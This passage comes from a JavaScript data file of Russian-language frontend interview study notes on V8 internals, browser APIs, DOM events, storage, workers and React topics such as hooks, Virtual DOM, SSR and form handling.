Мономорфный код (одни типы) → TurboFan оптимизирует → быстро
Полиморфный код (разные типы в одном месте) → частые деоптимизации → медленно
Большие бандлы → lazy parsing экономит время старта → code splitting помогает
eval(), with, arguments в некоторых случаях отключают оптимизации TurboFan`,score:3},{name:"Преобразование классов в рантайме. Приватные и статичные поля",level:"4",content:`**Преобразование класса:**
\`\`\`js
class User {
  constructor(name) { this.name = name; }
  greet() { ... }         // → User.prototype.greet
  static create() { ... } // → User.create (на самой функции)
}
\`\`\`

**Приватные поля (#):**
\`\`\`js
class User {
  #password = '123';
  changePassword(p) { this.#password = p; } // можно изнутри
}
user.#password; // SyntaxError! Снаружи недоступно
\`\`\`

**3 способа приватности:**
1. \`_\` — соглашение (не настоящая приватность)
2. \`WeakMap\` — настоящая, но громоздко
3. \`#\` — настоящая, встроенная в язык`,score:3},{name:"Оптимизации в V8: Скрытые классы, Inline Caching",level:"4",content:`**Скрытые классы (Hidden Classes)**

**Hashmap** — структура данных "ключ → значение". При чтении \`obj.name\` нужно вычислить хэш строки "name", найти ячейку, разрешить коллизии. Это O(1) в среднем, но с константными накладными расходами на каждое обращение.

V8 не хранит свойства объекта как hashmap — это медленно. Вместо этого он назначает каждому объекту Hidden Class (внутреннее описание формы) — какие свойства есть и по какому смещению в памяти. Тогда \`obj.name\` читается напрямую по смещению — как поле структуры в C, без хэширования.

\`\`\`js
const user = {};        // Hidden Class C0: {}
user.name = 'Alice';    // → C1: { name: offset 0 }
user.age = 25;          // → C2: { name: offset 0, age: offset 8 }
\`\`\`

Два объекта с **одинаковым порядком добавления свойств** разделяют один Hidden Class → V8 переиспользует оптимизации для обоих.

\`\`\`js
// ✅ Оба получат один Hidden Class C2
const a = {}; a.x = 1; a.y = 2;
const b = {}; b.x = 5; b.y = 10;

// ❌ Разные Hidden Classes — разный порядок свойств
const c = {}; c.x = 1; c.y = 2;
const d = {}; d.y = 2; d.x = 1;
\`\`\`

**Практика:** инициализировать все свойства в конструкторе в одинаковом порядке. Динамическое добавление свойств в разном порядке дробит оптимизации.

**delete — опасен:**
Удаление свойства переводит объект в **dictionary mode** (slow mode) — V8 переходит на настоящий hashmap, теряет скрытый класс. Вместо delete → присвой \`undefined\` или \`null\`.

---

**Inline Caching (IC)**

IC — оптимизация на уровне JIT. Каждый раз когда V8 впервые выполняет операцию вроде \`obj.prop\`, он не знает что там внутри — и делает полный поиск. Но он запоминает: "здесь был объект с Hidden Class C2, свойство prop — на смещении 8". При следующем вызове просто проверяет класс и читает по смещению — без хэширования, без поиска.

Проблема возникает когда в одно и то же место кода приходят объекты **разных форм**. V8 должен хранить кэш для каждой встреченной формы — и с каждой новой формой кэш становится дороже:

\`\`\`js
function getX(obj) { return obj.x; }

getX({ x: 1 });           // 1-я форма → IC: Uninitialized → Monomorphic
getX({ x: 2, y: 3 });     // 2-я форма → IC: Monomorphic → Polymorphic
getX({ a: 1, x: 4 });     // 3-я форма → IC: Polymorphic (растёт)
// ... 5+ форм → Megamorphic: кэш выброшен, каждый вызов — полный поиск
\`\`\`

Стадии — это не настройки, а **состояние кэша**. V8 сам переводит IC вперёд по мере того как видит новые формы:

- **Uninitialized** — функция ещё не вызывалась
- **Monomorphic** — одна форма → максимально быстро, кэш из одной записи
- **Polymorphic** — 2–4 формы → кэш на несколько вариантов, сравниваются линейно
- **Megamorphic** — 5+ форм → кэш выброшен, V8 ходит в глобальную хэш-таблицу

**Назад IC не откатывается.** Функция ставшая Megamorphic остаётся такой до следующей перекомпиляции — V8 переключается обратно на hashmap (полный поиск по хэшу при каждом обращении), теряя все преимущества скрытых классов. Поэтому утилитарные функции которые принимают любые объекты (lodash, Object.assign) сознательно написаны так чтобы не полагаться на IC.`,score:3.5},{name:"Proxy и Reflect",level:"4",content:`**Proxy** — обёртка вокруг объекта, которая перехватывает операции над ним. Сам объект не меняется — ты работаешь с прокси, а прокси решает что делать дальше.

\`\`\`js
const handler = {
  get(target, prop, receiver) {
    console.log(\`читаем \${prop}\`);
    return Reflect.get(target, prop, receiver); // стандартное поведение
  },
  set(target, prop, value, receiver) {
    if (typeof value !== 'number') throw new TypeError('только числа');
    return Reflect.set(target, prop, value, receiver);
  },
};

const proxy = new Proxy({}, handler);
proxy.x = 42;   // OK
proxy.x = 'hi'; // TypeError
\`\`\`

**Полный список ловушек** (каждая перехватывает свою операцию):
\`\`\`js
get(target, prop, receiver)              // obj.prop
set(target, prop, value, receiver)       // obj.prop = value
has(target, prop)                        // 'prop' in obj
deleteProperty(target, prop)             // delete obj.prop
apply(target, thisArg, args)             // fn()
construct(target, args)                  // new Fn()
ownKeys(target)                          // Object.keys(), for...in
defineProperty(target, key, desc)        // Object.defineProperty
getOwnPropertyDescriptor(target, key)    // Object.getOwnPropertyDescriptor
getPrototypeOf(target)                   // Object.getPrototypeOf
setPrototypeOf(target, proto)            // Object.setPrototypeOf
isExtensible(target)                     // Object.isExtensible
preventExtensions(target)                // Object.preventExtensions
\`\`\`

---

**Reflect** — зеркало операций JS. Для каждой ловушки Proxy есть соответствующий метод Reflect с той же сигнатурой.

Зачем не просто \`target[prop]\`:
\`\`\`js
// ❌ Без Reflect — теряем receiver, this в геттере будет target, а не proxy
get(target, prop) {
  return target[prop]; // если prop — геттер, this внутри = target
}

// ✅ С Reflect — receiver (прокси) правильно передаётся как this
get(target, prop, receiver) {
  return Reflect.get(target, prop, receiver);
}
\`\`\`
Это критично когда объект наследует геттеры — без receiver они сломаются.

---

**Инварианты Proxy:**
Proxy не может нарушать объектную модель JS. Если свойство \`non-configurable + non-writable\`, get-ловушка обязана вернуть то же значение что в target — иначе TypeError. Движок принудительно проверяет это независимо от твоего кода.

**Proxy.revocable():**
\`\`\`js
const { proxy, revoke } = Proxy.revocable(target, handler);
revoke(); // proxy мёртв → TypeError на любую операцию
\`\`\`
Кейс: временный доступ к объекту. После revoke все ссылки на proxy бесполезны — данные не утекут.

**Где используется:** Vue 3 реактивность (перехват get/set для отслеживания зависимостей), MobX, валидация данных, логирование, мемоизация.`,score:3},{name:"Map, Set, WeakMap, WeakSet",level:"3",content:`**Map** — коллекция ключ-значение. Ключом может быть что угодно (объект, функция, NaN):
\`\`\`js
const map = new Map();
map.set('key', 'value');
map.set(obj, 42);        // объект как ключ
map.get('key');          // 'value'
map.has('key');          // true
map.delete('key');
map.size;                // кол-во записей

// Итерация:
for (const [key, value] of map) { ... }
map.forEach((value, key) => { ... });
[...map.keys()], [...map.values()], [...map.entries()]
\`\`\`
Map vs Object: Map сохраняет порядок вставки, не имеет прототипных ключей, удобнее для итерации.

**Set** — коллекция уникальных значений:
\`\`\`js
const set = new Set([1, 2, 2, 3]); // Set {1, 2, 3}
set.add(4);
set.has(2);   // true
set.delete(2);
set.size;     // 3

// Удаление дублей из массива:
const unique = [...new Set(arr)];
\`\`\`

**WeakMap** — как Map, но:
• Ключи — только объекты
• Слабые ссылки — если объект-ключ больше нигде не используется, GC его удалит вместе с записью
• Нет итерации, нет size
\`\`\`js
const cache = new WeakMap();
cache.set(domNode, computedData); // удалится вместе с domNode
\`\`\`
Кейсы: кэш данных привязанный к объекту, приватные данные классов без утечек памяти.

**WeakSet** — как Set, но только объекты, слабые ссылки, нет итерации:
\`\`\`js
const seen = new WeakSet();
seen.add(obj);
seen.has(obj); // true
\`\`\`
Кейс: отмечать объекты как "обработанные" без удержания в памяти.

**Ключевое отличие Weak-версий:** не мешают сборщику мусора — объект удалится как только исчезнут все остальные ссылки на него.`,score:3.5}]},{id:"browser",title:"БРАУЗЕР И ЕГО ИНСТРУМЕНТЫ",icon:"🌐",color:"#4FC3F7",topics:[{name:"devTools (network, application)",level:"2",content:`**Network:** мониторинг HTTP-запросов, время загрузки, размеры, заголовки, тело ответа. Фильтрация по типу (XHR, JS, CSS, Img). Throttling (3G, offline).

**Application:** cookies, localStorage, sessionStorage, IndexedDB, Service Workers, Cache Storage, Manifests.

**Performance:** запись и анализ производительности, flame chart, CPU profiling.

**Elements:** DOM-дерево, стили, computed styles, box model.

**Console:** логирование, выполнение JS, фильтрация по уровням.

**Memory:** heap snapshots (сравнивать до/после — найти утечки), allocation timeline (что создаётся и удерживается), retained size — реальная память с учётом удерживаемых объектов.

**Coverage:** показывает % неиспользуемого JS/CSS при загрузке страницы. Помогает найти что вынести в lazy-load.

**Local Overrides:** редактировать файлы сайта прямо в DevTools — изменения переживают перезагрузку страницы. Удобно для экспериментов без локального сервера.

**Recorder:** запись пользовательских сценариев → воспроизведение → экспорт в Playwright/Puppeteer скрипты.`},{name:"breakpoints",level:"2",content:`**Типы breakpoints в DevTools:**

• **Line breakpoint** — пауза на конкретной строке кода
• **Conditional breakpoint** — срабатывает при условии (\`user.id === 5\`)
• **DOM breakpoint** — при изменении DOM-узла (subtree, attributes, node removal)
• **XHR/Fetch breakpoint** — при запросе к определённому URL
• **Event listener breakpoint** — при определённом событии (click, scroll)
• **Exception breakpoint** — при выбросе исключения

**Отладка:** Step over (F10), Step into (F11), Step out (Shift+F11), Resume (F8).

**Watch expressions** — отслеживание переменных. **Call Stack** — стек вызовов. **Scope** — текущие переменные.`},{name:"Всплытие и погружение событий",level:"2",content:`**3 фазы события:**
1. **Capturing (погружение)** — от window вниз к целевому элементу
2. **Target** — событие на целевом элементе
3. **Bubbling (всплытие)** — от целевого элемента вверх к window

\`\`\`js
el.addEventListener('click', handler, true);  // capturing
el.addEventListener('click', handler, false); // bubbling (по умолчанию)
\`\`\`

**event.stopPropagation()** — останавливает всплытие/погружение
**event.stopImmediatePropagation()** — + отменяет остальные обработчики на этом элементе
**event.preventDefault()** — отменяет действие по умолчанию (НЕ останавливает всплытие)

**Делегирование событий:** вешаем один обработчик на родителя, проверяем \`event.target\`.`},{name:"Основные браузерные события",level:"2",content:`**Mouse:** click, dblclick, mousedown, mouseup, mousemove, mouseenter, mouseleave, contextmenu
**Keyboard:** keydown, keyup, keypress (deprecated)
**Form:** submit, input, change, focus, blur
**Document:** DOMContentLoaded, load, beforeunload, unload
**Scroll/Resize:** scroll, resize
**Clipboard:** copy, paste, cut
**Touch:** touchstart, touchmove, touchend
**Drag:** dragstart, drag, dragend, dragover, drop

**DOMContentLoaded** — DOM готов, стили/картинки могут ещё грузиться
**load** — всё загружено (включая картинки, стили)

**Passive listeners:** \`{ passive: true }\` — обработчик не вызовет preventDefault(), браузер может оптимизировать скролл.`},{name:"Что такое DOM. JS Методы работы с узлами",level:"2",content:`**DOM (Document Object Model)** — древовидное представление HTML-документа. Каждый HTML-тег — узел (node).

**Поиск:**
\`\`\`js
document.getElementById('id')
document.querySelector('.class')      // первый
document.querySelectorAll('.class')   // все (статическая коллекция)
document.getElementsByClassName()     // живая коллекция
\`\`\`

**Создание/модификация:**
\`\`\`js
document.createElement('div')
element.append(child)      // в конец
element.prepend(child)     // в начало
element.before(sibling)    // перед
element.after(sibling)     // после
element.remove()           // удалить
element.cloneNode(true)    // глубокое клонирование
\`\`\`

**Атрибуты:** getAttribute, setAttribute, removeAttribute, dataset (data-*).
**Классы:** classList.add, remove, toggle, contains.

**DocumentFragment** — лёгкий узел вне DOM. Добавляй элементы пакетно, потом вставь один раз → один reflow:
\`\`\`js
const frag = document.createDocumentFragment();
items.forEach(item => {
  const li = document.createElement('li');
  li.textContent = item;
  frag.appendChild(li);
});
list.appendChild(frag); // единственный reflow
\`\`\`

**MutationObserver** — следит за изменениями в DOM (замена устаревшего MutationEvents):
\`\`\`js
const observer = new MutationObserver((mutations) => {
  mutations.forEach(m => console.log(m.type, m.addedNodes, m.attributeName));
});
observer.observe(element, {
  childList: true,    // добавление/удаление дочерних узлов
  subtree: true,      // всё поддерево
  attributes: true,   // изменения атрибутов
  characterData: true // изменения текстового контента
});
observer.disconnect();
\`\`\`
Используется в: React DevTools, rich text редакторах, analytics трекерах.`},{name:"iframe",level:"3",content:`**iframe** — встраивает другую HTML-страницу внутрь текущей.

\`\`\`html
<iframe src="https://example.com" sandbox="allow-scripts"></iframe>
\`\`\`

**Безопасность:**
• **sandbox** — ограничивает возможности: allow-scripts, allow-same-origin, allow-forms, allow-popups
• **Same-Origin Policy** — доступ к содержимому iframe только с того же домена
• **postMessage** — безопасное общение между окнами разных доменов

\`\`\`js
// Родитель → iframe
iframe.contentWindow.postMessage(data, 'https://target.com');

// iframe → родитель
window.parent.postMessage(data, 'https://parent.com');

// Приём
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://trusted.com') return;
  console.log(e.data);
});
\`\`\`

**X-Frame-Options** — заголовок, запрещающий встраивание сайта в iframe.`},{name:"Отладка WebSocket в браузере",level:"3",content:`В DevTools → Network → вкладка **WS** (WebSocket):
• Видны все WebSocket-соединения
• **Messages** — отправленные (зелёные) и полученные (красные) сообщения
• **Headers** — заголовки handshake (Upgrade: websocket)
• **Timing** — время установки соединения

Можно фильтровать по содержимому сообщений, видеть бинарные данные. Полезно для дебага real-time приложений (чаты, уведомления, торговые платформы).`},{name:"Базовое понимание cookies",level:"3",content:`**Cookies** — маленькие текстовые данные, отправляемые с каждым HTTP-запросом.

\`\`\`js
document.cookie = "name=value; max-age=3600; path=/; secure; samesite=strict";
\`\`\`

**Атрибуты:**
• **max-age / expires** — время жизни
• **path** — для какого пути доступна
• **domain** — для какого домена
• **secure** — только по HTTPS
• **httpOnly** — недоступна из JS (защита от XSS)
• **SameSite** — strict/lax/none (защита от CSRF)

**Ограничения:** ~4KB на cookie, ~20 cookies на домен.

**Типы:** Session cookies (без max-age, до закрытия браузера), Persistent (с max-age), Third-party (с другого домена — для трекинга).`},{name:"localStorage и sessionStorage",level:"3",content:`**localStorage:** данные сохраняются навсегда (до явного удаления)
**sessionStorage:** данные живут до закрытия вкладки

\`\`\`js
localStorage.setItem('key', JSON.stringify(data));
const data = JSON.parse(localStorage.getItem('key'));
localStorage.removeItem('key');
localStorage.clear();
\`\`\`

**Ограничения:** ~5-10MB, только строки, синхронный API (может блокировать).

**Отличия от cookies:**
• Не отправляются на сервер с каждым запросом
• Больше объём (5MB vs 4KB)
• Нет атрибутов безопасности (httpOnly, secure)

**Событие storage:** срабатывает в ДРУГИХ вкладках при изменении localStorage. Можно использовать для синхронизации между вкладками.`},{name:"Базовое понимание Selection и Range",level:"3",content:`**Range** — объект, представляющий фрагмент документа (от точки A до точки B).

\`\`\`js
const range = document.createRange();
range.setStart(node, offset);
range.setEnd(node, offset);
range.selectNodeContents(element);
\`\`\`

**Selection** — то, что выделил пользователь.

\`\`\`js
const selection = window.getSelection();
selection.toString();        // текст выделения
selection.getRangeAt(0);     // Range объект
selection.removeAllRanges(); // снять выделение
selection.addRange(range);   // программно выделить
\`\`\`

Применение: редакторы текста, подсветка поиска, кастомные контекстные меню.`},{name:"Особенности работы с браузерными событиями",level:"3",content:`**Throttle** — не чаще чем раз в N мс (scroll, resize).
**Debounce** — ждёт N мс после последнего вызова (input поиска).

**Passive listeners:**
\`\`\`js
el.addEventListener('scroll', handler, { passive: true });
\`\`\`
Обещаем не вызывать preventDefault() → браузер оптимизирует скролл.

**Event delegation:**
\`\`\`js
table.addEventListener('click', (e) => {
  const td = e.target.closest('td');
  if (!td || !table.contains(td)) return;
  highlight(td);
});
\`\`\`

**Custom Events:**
\`\`\`js
const event = new CustomEvent('myEvent', { detail: { id: 1 }, bubbles: true });
element.dispatchEvent(event);
\`\`\`

**once: true** — обработчик вызовется один раз и удалится автоматически.`},{name:"Живые коллекции, методы обработки и преобразования в массив",level:"3",content:`**Живая коллекция** — автоматически обновляется при изменении DOM:
\`\`\`js
const divs = document.getElementsByTagName('div'); // живая
// Добавили div → divs.length увеличится
\`\`\`

**Статическая коллекция** — снимок на момент вызова:
\`\`\`js
const divs = document.querySelectorAll('div'); // статическая
// Добавили div → divs.length НЕ изменится
\`\`\`

**Преобразование в массив:**
\`\`\`js
Array.from(collection)
[...collection]
Array.prototype.slice.call(collection)
\`\`\`

Живые: getElementsByClassName, getElementsByTagName, children
Статические: querySelectorAll`},{name:"Service workers",level:"4",content:`**Service Worker** — скрипт, работающий в фоне, отдельно от страницы.

\`\`\`js
navigator.serviceWorker.register('/sw.js');

// sw.js
self.addEventListener('install', (e) => {
  e.waitUntil(caches.open('v1').then(c => c.addAll(['/index.html', '/app.js'])));
});

self.addEventListener('fetch', (e) => {
  e.respondWith(
    caches.match(e.request).then(r => r || fetch(e.request))
  );
});
\`\`\`

**Возможности:** кэширование (офлайн), push-уведомления, фоновая синхронизация.
**Ограничения:** только HTTPS, нет доступа к DOM, асинхронный API.`},{name:"Web-workers",level:"4",content:`**Web Worker** — выполнение JS в отдельном потоке.

\`\`\`js
// main.js
const worker = new Worker('worker.js');
worker.postMessage({ data: bigArray });
worker.onmessage = (e) => console.log(e.data);

// worker.js
self.onmessage = (e) => {
  const result = heavyComputation(e.data);
  self.postMessage(result);
};
\`\`\`

**Ограничения:** нет доступа к DOM, window, document. Общение только через postMessage (сериализация).

**SharedWorker** — один воркер на несколько вкладок.
**Transferable Objects** — передача данных без копирования (ArrayBuffer).`},{name:"Как веб-приложение превратить в PWA",level:"4",content:`**PWA (Progressive Web App)** — веб-приложение с нативными возможностями.

**3 требования:**
1. **HTTPS** — обязательно
2. **Service Worker** — кэширование, офлайн
3. **Web App Manifest** — метаданные приложения

\`\`\`json
// manifest.json
{
  "name": "My App",
  "short_name": "App",
  "start_url": "/",
  "display": "standalone",
  "theme_color": "#000",
  "icons": [{ "src": "icon.png", "sizes": "192x192" }]
}
\`\`\`

**Возможности:** установка на домашний экран, push-уведомления, офлайн-работа, фоновая синхронизация.

**Стратегии кэширования:** Cache First, Network First, Stale While Revalidate.`},{name:"WebComponents, ShadowDOM, Custom Elements",level:"4",content:`**Custom Elements:**
\`\`\`js
class MyButton extends HTMLElement {
  connectedCallback() { this.innerHTML = '<button>Click</button>'; }
}
customElements.define('my-button', MyButton);
\`\`\`

**Shadow DOM** — инкапсулированное DOM-дерево, изолированное от внешних стилей:
\`\`\`js
const shadow = this.attachShadow({ mode: 'open' });
shadow.innerHTML = '<style>p { color: red; }</style><p>Isolated</p>';
\`\`\`

**HTML Templates:**
\`\`\`html
<template id="tmpl"><p>Reusable content</p></template>
\`\`\`
\`\`\`js
const tmpl = document.getElementById('tmpl');
const clone = tmpl.content.cloneNode(true);
shadow.appendChild(clone);
\`\`\`

**Slots** — точки вставки контента извне в Shadow DOM.`}]},{id:"react",title:"REACT",icon:"⚛️",color:"#61DAFB",topics:[{name:"Компоненты, свойства: Props, State, однонаправленный поток данных",level:"2",content:`**Однонаправленный поток:** данные (props) текут сверху вниз. Обратно — через колбэки.

**Props** — неизменяемы (read-only), передаются от родителя.
**State** — принадлежит компоненту, изменяется через setter, вызывает ререндер.

**Ререндер дочерних:** по умолчанию ВСЕ дети ререндерятся при ререндере родителя. React.memo — предотвращает, если props не изменились.

**Ловушка с memo + колбэками:** новая функция каждый ререндер → новая ссылка → memo бесполезен. Решение: useCallback.`,score:4.5},{name:"Особенности синтаксиса JSX",level:"2",content:"**JSX → React.createElement(type, props, children) → объект (React-элемент)**\n\n`className` вместо `class` (зарезервированное слово), `htmlFor` вместо `for`.\n\nВ React 17+ — `_jsx()` вместо createElement, не нужен `import React`.",score:4},{name:"Хуки: встроенные и пользовательские",level:"2",content:`**useState** — состояние компонента
**useEffect** — побочные эффекты (API, подписки)
**useMemo** — мемоизация результата вычисления
**useCallback** — мемоизация функции (= useMemo(() => fn, deps))
**useRef** — ссылка на DOM / хранение данных без ререндера
**useContext** — потребление контекста
**useReducer** — сложное состояние (как мини-Redux)
**useTransition** — помечает обновление как низкоприоритетное (UI не зависает при тяжёлых ререндерах)
**useLayoutEffect** — как useEffect, но синхронно после мутации DOM до отрисовки. Для измерения DOM и предотвращения визуального мерцания. Стоит дороже useEffect.
**useId** — стабильный уникальный ID для пары label/input. Решает проблему гидратации при SSR:
\`\`\`js
const id = useId();
return <><label htmlFor={id}>Name</label><input id={id} /></>;
\`\`\`
**useImperativeHandle(ref, () => api, deps)** — выставить наружу только нужные методы:
\`\`\`js
const Input = forwardRef((props, ref) => {
  const inputRef = useRef();
  useImperativeHandle(ref, () => ({
    focus: () => inputRef.current.focus(),
    clear: () => { inputRef.current.value = ''; }
  }));
  return <input ref={inputRef} />;
});
// Родитель: ref.current.focus() — только выставленное API
\`\`\`
**useSyncExternalStore(subscribe, getSnapshot)** — подписка на внешние сторы с поддержкой Concurrent Mode. Именно так работают Zustand, Redux Toolkit, Jotai.

**Правила хуков:**
1. Только на верхнем уровне (не в if/for/вложенных функциях)
2. Префикс \`use\`
React запоминает хуки по **порядку вызова**.`,score:4},{name:"Жизненный цикл компонента",level:"2",content:`**3 фазы:** Mounting → Updating → Unmounting

**useEffect маппинг:**
\`\`\`js
useEffect(() => { ... }, []);     // componentDidMount
useEffect(() => { ... }, [dep]);  // componentDidUpdate (для dep)
useEffect(() => {
  return () => { ... };           // componentWillUnmount
}, []);
\`\`\`

**shouldComponentUpdate** → React.memo (для функциональных).`,score:4},{name:"Фрагменты",level:"2",content:"Группировка без лишнего DOM-узла: `<Fragment>` или `<>...</>`.\n\n`<>` — нельзя передать key. `<Fragment key={id}>` — можно. Единственный случай для полного Fragment — списки.",score:5},{name:"Компоненты высшего порядка",level:"3",content:`**HOC** — функция, принимающая компонент → возвращающая новый с расширенной функциональностью.

\`\`\`jsx
function withAuth(Component) {
  return function(props) {
    if (!useAuth()) return <Redirect to="/login" />;
    return <Component {...props} />;
  };
}
const ProtectedPage = withAuth(Dashboard);
\`\`\`

HOC не изменяет оригинальный компонент, а оборачивает. Сейчас заменён хуками.`,score:4},{name:"Virtual DOM",level:"3",content:`**Зачем нужен Virtual DOM**

Прямые операции с реальным DOM дорогие — каждое изменение может вызвать reflow и repaint. Если при каждом обновлении состояния перерисовывать весь UI через innerHTML, это будет крайне медленно.

Virtual DOM — это легковесный JS-объект, который описывает как должен выглядеть DOM:
\`\`\`js
// JSX <div className="box"><p>Hello</p></div>
// компилируется в:
{
  type: 'div',
  props: { className: 'box' },
  children: [{ type: 'p', props: {}, children: ['Hello'] }]
}
\`\`\`

При изменении состояния React строит новое дерево VDOM и сравнивает его со старым — это называется **diffing**. В реальный DOM попадают только минимальные изменения.

**Reconciliation — алгоритм сравнения деревьев**

Наивный diff двух деревьев — O(n³). React использует эвристики и делает это за O(n):

**1. Разный тип элемента → снести поддерево и построить заново:**
\`\`\`jsx
// было:
<div><Counter /></div>
// стало:
<span><Counter /></span>
\`\`\`
React видит div → span: старый DOM-узел удаляется. Все дочерние компоненты (Counter) вызывают componentWillUnmount / cleanup useEffect. Их state уничтожается. Новое поддерево монтируется с нуля — componentDidMount / useEffect запускаются заново.

**2. Одинаковый тип DOM-элемента → обновить только изменившееся:**
\`\`\`jsx
// было: <div className="old" title="x" />
// стало: <div className="new" />
\`\`\`
DOM-узел тот же — React только патчит атрибуты (className меняет, title удаляет). Дочерние компоненты продолжают жить, их state сохраняется — рекурсивно применяется тот же алгоритм.

**2б. Одинаковый тип компонента → обновить props, перерендерить:**
\`\`\`jsx
// было: <Counter step={1} />
// стало: <Counter step={2} />
\`\`\`
Экземпляр компонента тот же — React обновляет props и вызывает рендер. State сохраняется. Запускается useEffect у которого изменились deps.

**3. Списки → React не знает что с чем сопоставить без key:**
\`\`\`jsx
// Без key при добавлении в начало React перерисует все элементы
// С key React знает: этот элемент переместился, а не пересоздался
[<li key="a">A</li>, <li key="b">B</li>]
\`\`\`
С правильным key: компонент переместился → React переиспользует экземпляр, state сохраняется. Без key или с изменившимся key: компонент считается новым → полный unmount + mount, state теряется.

**Почему index как key — антипаттерн:**
\`\`\`jsx
// Список: [A(0), B(1), C(2)]
// Вставили в начало D: [D(0), A(1), B(2), C(3)]
// React видит: key=0 изменился (был A, стал D) → обновляет
// Все элементы "изменились" → лишние ререндеры + баги со state инпутов
\`\`\`
Key должен быть стабильным уникальным идентификатором из данных (id из БД, slug и т.д.).

**VDOM — не бесплатный:**
Создание и сравнение VDOM тоже стоит памяти и CPU. Для очень простых случаев (статичные страницы, частые мелкие обновления) прямые DOM-операции могут быть быстрее. Svelte и Solid.js отказались от VDOM в пользу компиляции в точечные DOM-обновления.`,score:4},{name:"Способы оптимизации React-приложения",level:"3",content:`1. **memo/useMemo/useCallback** — мемоизация (применять предметно!)
2. **React.lazy + Suspense** — code splitting
3. **Виртуализация списков** — react-window, react-virtualized
4. **Колокализация стейта** — стейт ближе к месту использования
5. **Стейт-менеджеры** — точечная подписка на данные`,score:3.5},{name:"Предохранители (ErrorBoundary)",level:"3",content:`Классовый компонент, ловит ошибки в рендере и жизненном цикле дочерних.

**НЕ ловит:**
• Обработчики событий (onClick и т.д.)
• Асинхронный код (setTimeout, fetch)
• SSR
• Ошибки в самом ErrorBoundary

Можно размещать на разных уровнях дерева — если секция упадёт, остальное работает.`,score:3},{name:"Порталы и как ими пользоваться",level:"3",content:"```jsx\nimport { createPortal } from 'react-dom';\ncreatePortal(<Modal />, document.getElementById('modal-root'));\n```\n\nМонтирует в другой DOM-узел, но события всплывают по **React-дереву** (не DOM-дереву).",score:4},{name:"React Context",level:"3",content:`Решает **prop drilling**. createContext → Provider (value) → useContext.

**Проблема:** изменение value → ВСЕ подписчики ререндерятся. React.memo НЕ помогает (контекст обходит memo).

**Решение:** разделить на отдельные контексты (UserContext, ThemeContext).`,score:4.5},{name:"Концепция SSR. Ограничения применения",level:"3",content:`**CSR vs SSR**

CSR (Client-Side Rendering) — браузер получает пустой HTML и JS-бандл, React строит DOM на клиенте. Пользователь видит белый экран пока JS не загрузится и не выполнится.

SSR (Server-Side Rendering) — сервер запускает React, генерирует готовый HTML и отдаёт его. Браузер показывает контент сразу — ещё до загрузки JS.

**Как работает SSR + гидратация:**
\`\`\`
1. Запрос → сервер рендерит компоненты в HTML-строку
2. Браузер получает готовый HTML → показывает контент (FCP быстрый)
3. JS-бандл загружается
4. hydrateRoot() — React "оживляет" существующий DOM:
   привязывает обработчики событий, восстанавливает state
5. Страница становится интерактивной (TTI)
\`\`\`
Между шагами 2 и 5 — страница выглядит готовой, но не интерактивна. Это называется **hydration gap**.

**React API:**
\`\`\`js
// Клиент CSR:
creatRoot(document.getElementById('root')).render(<App />);

// Клиент SSR — гидратация существующего DOM:
hydrateRoot(document.getElementById('root'), <App />);

// Сервер (старый, синхронный — блокирует поток):
const html = renderToString(<App />);

// Сервер (React 18, стриминг — отдаёт HTML по частям):
const { pipe } = renderToPipeableStream(<App />, {
  onShellReady() { pipe(response); }
});
\`\`\`

**Streaming SSR** — сервер начинает отдавать HTML не дожидаясь рендера всей страницы. Работает вместе с \`<Suspense>\`: тяжёлые части стримятся позже, оболочка приходит сразу.

**Плюсы SSR:**
• Быстрый FCP — пользователь видит контент без ожидания JS
• SEO — поисковики получают готовый HTML
• Работает без JS на клиенте

**Ограничения и минусы:**
• Нет \`window\`, \`document\`, \`localStorage\` на сервере — весь браузерный API недоступен
• Увеличенный TTFB — сервер должен отрендерить прежде чем отдать
• Нагрузка на сервер — React выполняется при каждом запросе
• Гидратация должна дать идентичный DOM — расхождение сервер/клиент вызывает ошибки и полный перерендер
• Сложнее деплой — нужен Node.js сервер, не просто CDN

**Когда SSR оправдан:** публичные страницы с важным SEO, медленные устройства/соединения, контент-сайты. Для дашбордов за авторизацией — CSR проще и достаточно.`,score:3.5},{name:"Form managers",level:"3",content:`**Контролируемые компоненты:** значение в state, React управляет вводом. Каждый keystroke → setState → ререндер.
\`\`\`jsx
const [value, setValue] = useState('');
<input value={value} onChange={e => setValue(e.target.value)} />
\`\`\`
**Неконтролируемые компоненты:** DOM хранит значение, React читает через ref когда нужно.
\`\`\`jsx
const ref = useRef();
<input ref={ref} defaultValue="initial" />
// При сабмите: ref.current.value
\`\`\`

**React Hook Form** — работает через неконтролируемые компоненты + \`register\` (ref под капотом). React не знает о значениях полей до сабмита — ререндер только при ошибках валидации и сабмите. Производительный выбор для больших форм.

**Formik** — контролируемые компоненты, значение каждого поля в state. Каждый keystroke → setState → ререндер всей формы. При 20+ полях начинает тормозить. Зато проще для понимания и работы с зависимыми полями.

**Главное отличие:** RHF читает значения из DOM через refs в момент сабмита. Formik держит все значения в React state всё время — отсюда разница в производительности.

**Валидация схемами:**
\`\`\`js
const schema = z.object({
  email: z.string().email(),
  age: z.number().min(18)
});
const { register, handleSubmit, formState: { errors } } = useForm({
  resolver: zodResolver(schema)
});
\`\`\`

**React 19 — Server Actions**

Server Action — async-функция с директивой \`'use server'\`, которая выполняется на сервере. Вызывается с клиента как обычная функция, но запрос уходит на сервер автоматически — без fetch, без API-роута.

\`\`\`jsx
// actions.ts (серверный код)
'use server';
export async function saveUser(formData: FormData) {
  await db.users.create({ name: formData.get('name') });
  revalidatePath('/users'); // инвалидировать кэш Next.js
}
\`\`\`

\`\`\`jsx
// Вариант 1 — нативная форма (работает даже без JS на клиенте):
<form action={saveUser}>
  <input name="name" />
  <button>Save</button>
</form>

// Вариант 2 — программный вызов:
<button onClick={() => saveUser(formData)}>Save</button>
\`\`\`

**useActionState** — отслеживает состояние Server Action (pending, error, result):
\`\`\`jsx
const [state, formAction, isPending] = useActionState(saveUser, null);

<form action={formAction}>
  <input name="name" />
  <button disabled={isPending}>
    {isPending ? 'Сохраняем...' : 'Save'}
  </button>
  {state?.error && <p>{state.error}</p>}
</form>
\`\`\`

**Плюсы:** нет boilerplate с fetch/useState/loading, прогрессивное улучшение (форма работает без JS), серверный код не попадает в бандл клиента, типобезопасность end-to-end.

**Ограничения:** только в серверных окружениях (Next.js App Router, Remix и т.д.). В чистом React без фреймворка — не работает.`,score:3},{name:"React паттерны. Compound components. render-props",level:"4",content:`**Compound Components:** набор связанных компонентов через Context.
\`\`\`jsx
<Table>
  <Table.Header><Table.Cell>Name</Table.Cell></Table.Header>
